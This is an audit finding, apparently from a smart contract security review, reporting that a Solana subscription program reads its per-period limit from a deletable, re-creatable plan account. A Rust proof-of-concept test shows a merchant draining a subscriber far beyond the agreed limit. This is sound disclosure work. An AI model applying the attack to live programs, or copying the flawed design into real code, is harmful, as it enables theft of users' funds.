3.1.2 Malicious merchant can drain subscriber funds by deleting and recreating a plan with an
      inflated per-period amount

Severity: High Risk
Context: delete_plan.rs#L59, subscribe.rs#L150-L152, transfer_subscription.rs#L60, transfer_subscrip-
tion.rs#L75, subscription_delegation.rs#L23-L38
Description: The transfer_subscription instruction reads the per-period spending limit
( amount_per_period ) from the current on-chain Plan account data at the time of transfer, rather than
from a value snapshotted into the SubscriptionDelegation at subscribe time:
// transfer_subscription.rs:60
amount_per_period = plan.data.amount;

The Plan PDA is derived deterministically from seeds ["plan", owner, plan_id] . When a merchant
deletes an expired plan and recreates it with the same plan_id , the new plan occupies the exact
same PDA address. Existing SubscriptionDelegation accounts (which store the plan PDA as their
delegatee ) continue to reference the address, and all validation checks pass:
   • PDA address match ( transfer_subscription.rs ): subscription.header.delegatee ==
     plan_pda.address() passes because the address is unchanged.
   • Program ownership ( transfer_subscription.rs ): The new plan is owned by the program.
   • Mint check ( transfer_subscription.rs ): The merchant recreates the plan with the same mint.
   • Puller authorization ( transfer_subscription.rs ): The merchant is still the plan owner.
The only field that changed is the plan.data.amount and is the one read without any cross-check against
the subscriber's original agreement. The merchant sets amount = u64::MAX on the new plan and drains
the subscriber's entire token balance in a single transfer.

 Proof of Concept: The following test is added to subscribe.rs and passes on the current codebase,
confirming the vulnerability:
#[test]
fn ghost_subscription_attack_via_plan_recreation() {
    let (mut litesvm, alice) = setup();
    let merchant = Keypair::new();
    litesvm.airdrop(&merchant.pubkey(), 10_000_000_000).unwrap();

    let mint = init_mint(
        &mut litesvm,
        TOKEN_PROGRAM_ID,
        MINT_DECIMALS,
        1_000_000_000,
        Some(alice.pubkey()),
        &[],
    );
    let alice_ata = init_ata(&mut litesvm, mint, alice.pubkey(), 100_000_000);
    let merchant_ata = init_ata(&mut litesvm, mint, merchant.pubkey(), 0);

    initialize_multidelegate_action(&mut litesvm, &alice, mint)
        .0
        .assert_ok();

    // Step 1: Merchant creates plan and Alice agrees to 1_000 tokens/period max.
    let original_amount = 1_000u64;
    let end_ts = current_ts() + days(2) as i64;
    let (res, plan_pda) = CreatePlan::new(&mut litesvm, &merchant, mint)
        .plan_id(1)
        .amount(original_amount)
        .period_hours(1)
        .end_ts(end_ts)
        .execute();
    res.assert_ok();

    // Step 2: Alice subscribes, trusting the 1_000/period limit.
    let (_, plan_bump) = get_plan_pda(&merchant.pubkey(), 1);
    Subscribe::new(
        &mut litesvm,
        &alice,
        merchant.pubkey(),
        plan_pda,
        1,
        plan_bump,
        mint,
    )
    .execute()
    .assert_ok();

    let (subscription_pda, _) = get_subscription_pda(&plan_pda, &alice.pubkey());

    // Step 3: Confirm the original limit IS enforced and pulling 1_001 fails.
    TransferSubscription::new(
        &mut litesvm,
        &merchant,
        alice.pubkey(),
        mint,
        subscription_pda,
        plan_pda,
    )
    .amount(original_amount + 1)
    .execute()
    .assert_err(MultiDelegatorError::AmountExceedsPeriodLimit);

    // Step 4: Time passes, plan expires. Merchant deletes it.
    move_clock_forward(&mut litesvm, days(3));

       DeletePlan::new(&mut litesvm, &merchant, plan_pda)
          .execute()
          .assert_ok();

      // Step 5: Merchant recreates plan with SAME plan_id but 50,000x the amount.
      let malicious_amount = 50_000_000u64;
      let new_end_ts = current_ts() + days(60) as i64;
      let (res, new_plan_pda) = CreatePlan::new(&mut litesvm, &merchant, mint)
          .plan_id(1)
          .amount(malicious_amount)
          .period_hours(1)
          .end_ts(new_end_ts)
          .execute();
      res.assert_ok();

      // The plan PDA is deterministic so same seeds produce same address.
      assert_eq!(plan_pda, new_plan_pda, "recreated plan must have same PDA");

      // Step 6: Merchant pulls 50_000_000 from Alice's old subscription.
      //         Alice only ever consented to 1_000/period.
      let alice_balance_before = get_ata_balance(&litesvm, &alice_ata);

      TransferSubscription::new(
          &mut litesvm,
          &merchant,
          alice.pubkey(),
          mint,
          subscription_pda,
          new_plan_pda,
      )
      .amount(malicious_amount)
      .execute()
      .assert_ok();

      // Attack succeeded: merchant stole 50,000x what Alice agreed to.
      assert_eq!(get_ata_balance(&litesvm, &merchant_ata), malicious_amount);
      assert_eq!(
          get_ata_balance(&litesvm, &alice_ata),
          alice_balance_before - malicious_amount,
      );
}

